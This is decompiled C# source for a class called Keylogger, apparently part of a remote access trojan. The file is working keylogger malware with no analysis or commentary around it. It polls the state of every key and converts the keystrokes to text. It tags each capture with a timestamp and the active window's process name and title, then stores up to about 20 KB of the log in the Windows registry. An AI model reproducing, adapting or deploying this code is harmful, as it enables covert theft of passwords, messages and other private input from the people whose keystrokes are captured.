using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Lime;

public class Keylogger
{
	private int LastAV;

	private string LastAS;

	private Keys lastKey;

	public string Logs;

	public string vn;

	public Keyboard keyboard;

	public Keylogger()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		lastKey = (Keys)0;
		Logs = "";
		vn = "[kl]";
		keyboard = new Keyboard();
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder d, int e, uint f, IntPtr g);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] a);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint a, uint b);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int a);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int a);

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = Program.GetForegroundWindow();
			int b = 0;
			GetWindowThreadProcessId(foregroundWindow, ref b);
			Process processById = Process.GetProcessById(b);
			if (!(((foregroundWindow.ToInt32() == LastAV) & (Operators.CompareString(LastAS, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd ") + processById.ProcessName + " " + LastAS + "\u0001\r\n";
			}
		}
		catch
		{
		}
		return "";
	}

	private static string VKCodeToUnicode(uint a)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			uint b = MapVirtualKey(a, 0u);
			IntPtr foregroundWindow = Program.GetForegroundWindow();
			IntPtr a2 = foregroundWindow;
			int b2 = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(a2, ref b2);
			IntPtr g = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		return ((object)(Keys)checked((int)a)).ToString();
	}

	private string Fix(Keys k)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Invalid comparison between Unknown and I4
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Invalid comparison between Unknown and I4
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Invalid comparison between Unknown and I4
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Invalid comparison between Unknown and I4
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Invalid comparison between Unknown and I4
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Invalid comparison between Unknown and I4
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Invalid comparison between Unknown and I4
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Invalid comparison between Unknown and I4
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Invalid comparison between Unknown and I4
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Invalid comparison between Unknown and I4
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Invalid comparison between Unknown and I4
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Invalid comparison between Unknown and I4
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Invalid comparison between Unknown and I4
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Invalid comparison between Unknown and I4
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Invalid comparison between Unknown and I4
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Invalid comparison between Unknown and I4
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Invalid comparison between Unknown and I4
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected I4, but got Unknown
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected I4, but got Unknown
		bool flag = keyboard.get_ShiftKeyDown();
		if (keyboard.get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)k != 46 && (int)k != 8)
			{
				if ((int)k != 160 && (int)k != 161 && (int)k != 65536 && (int)k != 16 && (int)k != 131072 && (int)k != 17 && (int)k != 163 && (int)k != 162 && (int)k != 262144 && (int)k != 112 && (int)k != 113 && (int)k != 114 && (int)k != 115 && (int)k != 116 && (int)k != 117 && (int)k != 118 && (int)k != 119 && (int)k != 120 && (int)k != 121 && (int)k != 122 && (int)k != 123 && (int)k != 35)
				{
					if ((int)k == 32)
					{
						return " ";
					}
					if ((int)k != 13 && (int)k != 13)
					{
						if ((int)k == 9)
						{
							return "[TAP]\r\n";
						}
						checked
						{
							if (flag)
							{
								return VKCodeToUnicode((uint)k).ToUpper();
							}
							return VKCodeToUnicode((uint)k);
						}
					}
					if (Logs.EndsWith("[ENTER]\r\n"))
					{
						return "";
					}
					return "[ENTER]\r\n";
				}
				return "";
			}
			return "[" + ((object)k).ToString() + "]";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void WRK()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		Logs = Conversions.ToString(Program.GetValueFromRegistry(vn, ""));
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !keyboard.get_CtrlKeyDown())
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("20") * 1024;
						if (Logs.Length > num3)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						Program.SaveValueOnRegistry(vn, Logs, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch
			{
			}
		}
	}
}
